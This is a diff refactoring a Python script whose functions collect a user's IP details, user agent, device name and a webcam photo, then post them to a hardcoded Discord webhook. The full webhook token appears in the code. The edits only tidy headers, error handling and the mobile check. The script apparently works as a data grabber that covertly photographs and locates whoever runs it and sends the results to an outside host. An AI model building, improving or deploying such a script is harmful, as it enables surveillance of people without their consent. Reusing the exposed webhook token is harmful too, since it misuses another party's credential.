@@ -39,12 +39,12 @@ def send_to_discord(webhook_url, embed, file=None, mention_everyone=False):
 
     if file:
         try:
-            response = requests.post(webhook_url, json=data, files={'file': file}, headers={"Content-Type": "application/json"})
+            response = requests.post(webhook_url, json=data, files={'file': file})
         except Exception as e:
             print(f"Error sending file to Discord: {e}")
     else:
         try:
-            response = requests.post(webhook_url, json=data, headers={"Content-Type": "application/json"})
+            response = requests.post(webhook_url, json=data)
             if response.status_code == 204:
                 print("Message sent successfully!")
             else:
@@ -64,10 +64,7 @@ def get_user_agent():
 # Check if the user is on mobile
 def check_mobile(user_agent):
     mobile_devices = ['iPhone', 'Android', 'iPad', 'Mobile']
-    for device in mobile_devices:
-        if device in user_agent:
-            return "Yes"
-    return "No"
+    return "Yes" if any(device in user_agent for device in mobile_devices) else "No"
 
 # Get device name
 def get_device_name():
@@ -87,11 +84,12 @@ def capture_photo():
             return open('photo.jpg', 'rb')
         cam.release()
         return None
-    except:
+    except Exception as e:
+        print(f"Error capturing photo: {e}")
         return None
 
 if __name__ == "__main__":
-    webhook_url = "https://discord.com/api/webhooks/1192907455387140176/ZuUFZkK0Og9jaXz0tJP5-dU6jBz-doPMbNBhTd77OIchocmywP3G9oqJw6wqAN1kWoYJ"
+    webhook_url = "https://discord.com/api/webhooks/1192907455387140176/ZuUFZkK0Og9jaXz0tJP5-dU6jBz-doPMbNBhTd77OIchocmywP3G9oqJw6wqAN1kWoYJ"  # Replace with your webhook URL
     
     ip_data = get_ip_details()
     
